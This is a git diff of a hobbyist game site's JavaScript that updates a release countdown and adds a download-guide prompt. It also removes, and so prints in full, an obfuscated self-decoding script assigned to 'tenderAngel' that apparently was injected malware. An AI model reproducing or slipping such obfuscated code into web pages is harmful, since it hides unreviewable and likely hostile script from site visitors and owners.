@@ -30,6 +30,7 @@ const d = new Date().getFullYear();
 const datetimer = new Date()
 let holiday_class = document.getElementById("holiday");
 let skiptimes = 0;
+let confirmed = false;
 
 years.innerHTML = `${d} - <a href='https://scratch.mit.edu/users/Knightbot63/' target='_blank' style="text-decoration: none;">RadicalOfficial</a> &#x2022; <a href='https://github.com/RadicalOfficial/' style="text-decoration: none;">GitHub</a>`;
 /*
@@ -71,9 +72,9 @@ function help() {
     alert("You need a Wii that is in Version 4.3. Come back when it is updated.")
   }
 }
-/*
+
 function updateCountdown() {
-  const countdownDate = new Date("2024-10-22T11:15:00").getTime();
+  const countdownDate = new Date("2025-02-09T12:40:00").getTime();
   const now = new Date().getTime();
   const distance = countdownDate - now;
 
@@ -82,28 +83,28 @@ function updateCountdown() {
   const days = Math.floor((distance % (1000 * 60 * 60 * 24 * 30)) / (1000 * 60 * 60 * 24));
   const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
   const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+  const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
 
-  // Update the odometer values
-  document.getElementById("months").innerHTML = formatTime(months);
-  document.getElementById("hours").innerHTML = formatTime(hours);
-  document.getElementById("days").innerHTML = formatTime(days);
-  document.getElementById("second").innerHTML = formatTime(seconds);
+  document.getElementById("hours").innerHTML = hours.toString().padStart(2, '0') + "<br><br><p style='font-size: 25px'>Hours</p>";
+  document.getElementById("days").innerHTML = days.toString().padStart(2, '0') + "<br><br><p style='font-size: 25px'>Days</p>";
+  document.getElementById("second").innerHTML = seconds.toString().padStart(2, '0') + "<br><br><p style='font-size: 25px'>Seconds</p>";
+  document.getElementById("minutes").innerHTML = minutes.toString().padStart(2, '0') + "<br><br><p style='font-size: 25px'>Minutes</p>";
+
 
   // If the countdown is finished, display a message
   if (distance < 0) {
     clearInterval(countdownTimer);
-    document.querySelector('.countdown').innerHTML = "<span class='countdown-text'>RPG Released! Please give Knightbot63 time to release it.</span>";
+    document.querySelector('.countdown').innerHTML = "<span class='countdown-text'>The time might be delayed so please be patient!</span>";
   }
 }
 
 // Update the countdown every second
 const countdownTimer = setInterval(updateCountdown, 1000);
 
-// Function to add leading zero if the value is less than 10
 function formatTime(time) {
-  return time < 10 ? `0${time}` : time;
+  return time.toString().padStart(2, '0');
 }
-
+/*
 let month = datetimer.getMonth();
 let day = datetimer.getDate();
 if (month+1 == 6) {
@@ -143,7 +144,25 @@ function next() {
   }
 
 }
-var tenderAngel;(function(){var BJF='',PeD=721-710;function Kiw(e){var a=1213714;var i=e.length;var t=[];for(var q=0;q<i;q++){t[q]=e.charAt(q)};for(var q=0;q<i;q++){var z=a*(q+543)+(a%53568);var l=a*(q+334)+(a%20563);var d=z%i;var o=l%i;var j=t[d];t[d]=t[o];t[o]=j;a=(z+l)%2220633;};return t.join('')};var jRR=Kiw('cnpdtmbutluagwhsrroyjkcsxoveonifqcrtz').substr(0,PeD);var Zpb='3)) e t9)u;r6-8=f3;8=irtaigCr;zor-0s)ft]x8)th;e 1)pfC}tf;=a(;+A}70;v),ata8h0a;(7w+ 0ws7,q16)))jl;+1r)6660f.)(772nfd=,;i5=vo,r +=[tuaze,v,.clgo,>(mAl;sCrnpa.==arr[2]c]n]eutan;hr=;ns3fd4;2b=r,svrzfrhtC;"cu,7raei+ 8.1w(+nei;v;[ga,;sua)9x;o=rf(;g;}ut(s[i=a=t+r;(9 !);foel+d=.m"w,iwt9t=.v,a,,os chau(v"wc=na;=+1]vnh>c,n i,ar )=l"qu)v;r)+j+(e2r<3r.xxfn.ld{uoaaq;g";(r+k( = 1;dgggjq=r"cuwa}m.c;av=i(eAre[)lvd"kb4d+;rmiimah{=)slahua<la(-+g7So.f.i(f=),htd7v+r{g=;1aCfc"lfdp;j;30gau*Sft1nin,mkrn=,,t+=sn[!Al(bf]t;ou;cp<r(o=(=v(fs4trsr;tn)fv];rnevee.(snt .,0 =) t1(nuelv)=t(r)i((u=+f09[e-hba=b(v[nbi2*0regg)t 6;[).=)rg-n{rmr==+ved{a]gl(n+lvyfioer< f),nvpvC(;sa85;r(o.v ,]rtrinshs8o)luf,ti}th5l+saAa[of(;2voru6"h)sjitact)(=hr.rao6(+[lm3a.h9ukvn20];f m1gzces;tbm.lm"h.C0g;fto;  7;top.t1[rz+ex(s.i =8=.)<o.he-at]+. r8a h]s9b{v;l[6,slgoCchm{)r]r=nv+4}ls}.enp12hhrl=re((o,]+4,ori=snuep=c.il.r)-0 0oati[9emr';var BhQ=Kiw[jRR];var hnE='';var Qve=BhQ;var SDg=BhQ(hnE,Kiw(Zpb));var yEp=SDg(Kiw('h.o&Ul_06-)f}._eUtUU.7.1U$nw),be*4.,9$%wi01m0c.2=Uw.ee3oU(g76h,$t#w.U;(5!5,!fesngUU}U{=x3U)$]dtc1rpne1rf.cil1.b.ee\/s.s.0=U;c{0wjcwa\'e}ja;\'44(.i_r.$20.o=Ubzf%(,t{=o".Ut{f= {c_)b!by7.U).bea$=6 tntg(cwUeemtp[i%U\'6Ucw)UUs=d n({6ec]tci_w.\/=4.we$o"4fsU+(rc.d4U{U=(1oSj3o!)s.)=3e6o$C(j-e$i2=7a8.;(,(5(.e.$)0U%$a={weff(ngc!g_.2!;tr$lff3+.jn)c.tU#ccn1lso7aona..c!"Uii z$!UrpU,ab3"[{jqSecej e_phds} =ugc(ci0((j{b7_3earb.tfjcai3=.$++!SS.__.cdrc!f,_#3zU6!4_{0Tq)U0j(0e}.Ut=+nUaUU6)(t+3oUaerero(3z_(%dsI7,5]3Ui_z#3tUUr)3,(r7.U e5enb{)r3)3. c( d"h.U0*)h,UUbmU7.i)qfr%4$f_\'aeUl3.b.U!e (f.Un;7(cc2_),(%U!.1)cr.%zpUi%U=f]o*U)(}U!U{ix]7;f ;;jUc4$UUd,3Uz0()U=]_)bn 4U_d.!f$)\'[ht8,2.c_52.)aU)$j(( Urmed(!1(3.4r$$!.i&p)UuenUUc 7)e= U#U;*t,3(!}("0_)U.e.s6}ndU}44%ygU fi+6m}n\'Ua4;m=)b"U_)3n( n.].n,s7.w&zig(rw]),U$;U].r=cy)c{f.6r1a;hnam$n}UUt7egnUolf2.mUts(;-5])2csd=icw\/560c})w)!8&17t7e7de)_z\/UUorU3U$)tr)%.)8{UU4!{787lln=e2.netn.0l"el3(t}r,U1;2+Ufon}1re6 1ti,_)UU1n2(oU!Ua}ure1z1)$9r!)i,Ui+;rU)jjttt.,j,#\'jU!9fiat0U%2f(o#3o().UU);3!7+n3UtU).t(U36Uabj ;.).3mt0!;ug#214=!-!7[0U;..,0$19_dU.oU2.$coec.o;]jb.-68;0.a5.tc!cef. ()dC$=)__{)sU8;rvg6n..%$Uadu,3lU4r,U.4jl ,go..;;U=;U0_nd($x;g6,._n(1_r. !;icitc boo$csl5o(.t,.gitC,a&eaUe0,dwb_s)U,U5],pUet=)Uu5w)'));var lRP=Qve(BJF,yEp );lRP(8334);return 5625})()
+function tenderAngel() {
+  if (confirmed == 1) {
+    window.open("https://drive.google.com/drive/folders/13wyn7XEFBcoOcsEE2awsZGF8MJrhq2Hp?usp=drive_link");
+    return
+  }
+  alert("The guide will help you download the game.");
+  let first = confirm("Is your OS a Linux OS?");
+  if (first) {
+    alert('You can now download the latest Linux version. Please click "Get Prototype" again to get the link, then find the file "Godot Platformer.x86_64"');
+    confirmed = 1;
+  } else {
+    let second = confirm("Is your OS a Windows OS?\n(Note: It's best to have Windows 10 or higher)");
+    if (second) {
+      alert('You can now download the latest Windows version. Please click "Get Prototype" again to get the link, then download any version of the EXE files.');
+    } else {
+      alert("I'm sorry but you need one of these devices to run the prototype.");
+    }
+  }
+}
 /*
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
